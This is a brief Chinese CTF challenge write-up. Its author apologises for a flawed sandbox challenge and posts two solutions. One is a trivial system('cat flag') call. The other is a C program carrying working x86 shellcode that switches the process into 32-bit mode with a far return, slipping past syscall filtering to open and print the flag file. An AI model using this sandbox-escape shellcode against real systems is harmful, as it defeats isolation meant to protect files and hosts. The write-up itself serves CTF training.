[中文](./README_zh.md) [English](./README.md)

[附件](./attachment.zip)

先跟各位师傅说声对不起......其实这道题没出好，本意是想出道代码审计的题目的，结果原来的库的bug比预期的多......

下面是一个非预期解

```
#include <stdio.h>

int main()
{

    system("cat flag");
}
```

下面是一个预期解，基本思想是利用32位的syscall去绕过限制，去读取文件

```
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h> /* mmap() is defined in this header */
#include <fcntl.h>
#include <string.h>
unsigned char shellcode[]= \
"\x6a\x01\xfe\x0c\x24\x68\x66\x6c\x61\x67\x89\xe3\x31\xc9\x31\xd2\x6a\x05\x58\xcd\x80\x68\x00\x38\x12\x00\x59\x89\xc3\xba\x00\x01\x00\x00\x6a\x03\x58\xcd\x80\xbb\x01\x00\x00\x00\xb9\x00\x38\x12\x00\xba\x00\x01\x00\x00\x6a\x04\x58\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80";
/*
push   0x1
dec    BYTE PTR [esp]
push   0x67616c66
mov    ebx,esp
xor    ecx,ecx
xor    edx,edx
push   0x5
pop    eax
int    0x80
push   0x123800
pop    ecx
mov    ebx,eax
mov    edx,0x100
push   0x3
pop    eax
int    0x80
mov    ebx,0x1
mov    ecx,0x123800
mov    edx,0x100
push   0x4
pop    eax
int    0x80
mov    eax,0x1
int    0x80
*/

unsigned char bypass[] = \
"\x48\x31\xe4\xbc\x00\x34\x12\x00\x67\xc7\x44\x24\x04\x23\x00\x00\x00\x67\xc7\x04\x24\x00\x30\x12\x00\xcb";
/*
xor rsp,rsp
mov esp,0x123400
mov    DWORD PTR [esp+0x4],0x23
mov    DWORD PTR [esp],0x123000
retf
*/

int main()
{
    char* p1=mmap(0, 0x1000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    char* p2=mmap((void*)0x123000,0x1000,7,MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memcpy(p1,bypass,sizeof(bypass));
    memcpy(p2,shellcode,sizeof(shellcode));
    int (*ret)() = (int(*)())p1;
    ret();
    return 0;
}

```
